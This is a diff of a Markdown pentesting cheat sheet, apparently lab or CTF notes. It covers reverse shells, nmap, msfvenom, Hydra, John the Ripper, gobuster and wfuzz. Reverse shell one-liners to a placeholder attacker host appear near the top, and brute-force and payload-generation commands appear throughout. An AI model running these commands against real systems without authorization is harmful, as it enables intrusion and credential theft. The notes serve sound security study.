@@ -2,7 +2,7 @@
 
 ## 0. How to Obtain a *Reverse Shell*
 First, run the following command on your terminal to get a raw tty:
-```bash
+```
 nc -nlvp {attacker port}
 ```
 
@@ -11,18 +11,18 @@ This command will listen on the specified port, waiting for the target machine t
 - Windows
 	1. Download netcat
 	2. Execute:
-```bash
+```
 ./nc.exe {attacker ip} {nc -nlvp {attacker port} -l cmd.exe
 ```
 
 - Linux
 	1. Execute:
-```bash
+```
 bash -i >& /dev/tcp/{attacker ip}/{attacker port} 0>&1	
 ```
 
 Once you have the reverse shell, to make it fully interactive, run:
-```bash
+```
 script /dev/null -c bash
 stty raw -echo; fg
 reset xterm
@@ -36,7 +36,7 @@ Now you can interact with a fully functional tty.
 
 The *arp-scan* is used to scan the network (usually local) to discover the target machine's IP.
 Common command:
-```bash
+```
 arp-scan -I {iface} --localnet
 ```
 
@@ -44,12 +44,12 @@ arp-scan -I {iface} --localnet
 
 ---
 
-## 2. *nmap*
-*nmap* is a versatile tool for port scanning. Some of the most useful scans:
+## 2. *Nmap*
+*Nmap* is a versatile tool for port scanning. Some of the most useful scans:
 ### 2.1. Port Enumeration
 First scan to list open ports (you can use extractPorts to copy them easily):
-```bash
-nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@IP victim} -oG allPorts
+```
+nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn {@victimIP} -oG allPorts
 ```
 
 Parameters explained:
@@ -61,17 +61,17 @@ Parameters explained:
 5. **-vvv** → verbose output
 6. **-n** → skip DNS resolution for more velocity
 7. **-Pn** → skip host discovery with ping
-8. **-oG** allPorts→ save output in greppable format in the file that we specifie (on this case *allPorts*)
+8. **-oG allPorts**→ save output in greppable format in the file that we specifie (on this case *allPorts*)
 
-Use *extractPorts* to filter relevant ports:
-```bash
+Use extractPorts to filter relevant ports (extractPorts is a utility included with Kali Linux that copies the ports to the clipboard):
+```
 extractPorts allPorts
 ```
 
 ### 2.2. Detailed Port Scan
 After obtaining the list of ports, perform a more thorough scan:
-```bash
-nmap -sCV -p{copied ports} {@victym ip} -oN targeted
+```
+nmap -sCV -p{copied ports} {@victimIP} -oN targeted
 ```
 
 Parameters:
@@ -81,17 +81,16 @@ Parameters:
 3. **-oN targeted** → save in normal format for easy reading (on this case to *targeted*)
 
 
-You now have two files: allPorts (greppable) and targeted (full scan output), that you can simply check whenever you want.
-```bash
+You now have two files: `allPorts` (greppable output) and `targeted` (full scan output), which you can review whenever needed. Note that `cat` is aliased to `bat`, a more powerful alternative with syntax highlighting support. We are also using the `-l ruby` option to display the output more clearly.
+```
 cat -l ruby targeted
 ```
-Those scans are the basics, in the future we may need to list closed or filter ports...
 
 ---
 
 ## 3. Searchsploits
 Useful for finding known vulnerabilities in services:
-```bash
+```
 searchsploits {version & service}
 ```
 
@@ -101,12 +100,12 @@ Always complement with online searches (GitHub, Exploit-DB).
 
 ## 4. Msfvenom
 This tool is used to generate custom payloads for a wide variety of operating systems and architectures. To do this, the first thing to do is list the payloads and filter them using *grep* with keywords. The command to list payloads is as follows:
-```bash
+```
 msfvenom -l
 ```
 
 Once we have found the payload that interests us, to save it on our machine we must execute the following command
-```bash
+```
 msfvenom -p {payload} LHOST={@attacker ip} LPORT={listener port} -f {filetype} -o {filename.extension}
 ```
 
@@ -114,7 +113,7 @@ msfvenom -p {payload} LHOST={@attacker ip} LPORT={listener port} -f {filetype} -
 
 ## 5. Nessus
 Another tool for scanning and reporting vulnerabilities is Nessus. Nessus is a service that runs on port 8834 on our computer (localhost) with the HTTPS service. To use it, you must first start the service using
-```bash
+```
 systemctl start nessusd.service
 ```
 
@@ -132,7 +131,7 @@ Burpsuite is an interception proxy that acts as an intermediary between a websit
 
 ## 7. Gobuster
 Gobuster is a tool that allows you to enumerate directories on a website using a dictionary. This attack is called fuzzing, and it's primarily useful for gathering information. The most commonly used command is the following:
-```bash
+```
 gobuster dir -w {dictionary} -u {URL} -t {number of threads} -x {extensions}
 ```
 
@@ -147,7 +146,7 @@ gobuster dir -w {dictionary} -u {URL} -t {number of threads} -x {extensions}
 
 ## 8. Hash-identifier + John The Ripper
 These two tools are often used together. The first, *hash-identifier*, is used to identify the type of hash used to encrypt a string, and *John The Ripper* is used to decrypt it (to use it, you must pass the hash type as a parameter). The commands are as follows:
-```bash
+```
 hash-identifier
 john --format=Raw-{Tipo hash} --wordlist={dictionary} {file with the hash}
 ```
@@ -158,7 +157,7 @@ The dictionary par excellence is *"/usr/share/wordlists/rockyout.txt"*.
 
 ## 9. Hydra
 Hydra is a tool for executing brute-force attacks. For this attack, you need to know the service you're attempting to attack (FTP, SSH, HTTP, etc.), and it's recommended to know one of the two credentials (either username or password), since if you don't know either and execute the brute-force attack with two dictionaries, it can take a long time. Below are the three most common FTP scenarios (to change the service, simply change ftp to the desired service (SSH, HTTP, etc.).
-```bash
+```
 hydra -l {user} -P {dictionary} ftp://{victym ip}
 hydra -L {dictionary} -p {password} ftp://{victym ip}
 hydra -L {dictionary} -P {dictionary} ftp://{victym ip} (don't do that, expends a lot of time)
@@ -168,7 +167,7 @@ hydra -L {dictionary} -P {dictionary} ftp://{victym ip} (don't do that, expends 
 
 # 10. Wfuzz
 Tool used to list a website's subdomains. The command used is as follows:
-```bash
+```
 wfuzz -c --nc 400 -t 200 -w <dictionary> -v <domain> -H "HOST: FUZZ.<domain>"
 ```
 
@@ -179,11 +178,11 @@ Thus, the *wfuzz* command searches for subdomains by changing the word *FUZZ* to
 # 11. Base64
 
 This is very useful and comes up a lot (it's used a lot). To decode base64 strings, run the following command:
-```bash
+```
 echo "base64_string" | base64 --decode
 ```
 To encode in base64, execute the following:
-```bash
+```
 echo "text" | base64
 ```
 
@@ -192,6 +191,6 @@ echo "text" | base64
 # 12. WhatWeb
 An open-source tool designed to identify technologies used on websites. WhatWeb can detect content management systems (CMS), blogging platforms, statistical analysis packages, JavaScript libraries, web servers, and embedded devices. It can also identify version numbers, email addresses, account IDs, web framework modules, SQL errors, and more. The command used is as follows:
 
-```bash
+```
 whatweb http://example.com
 ```
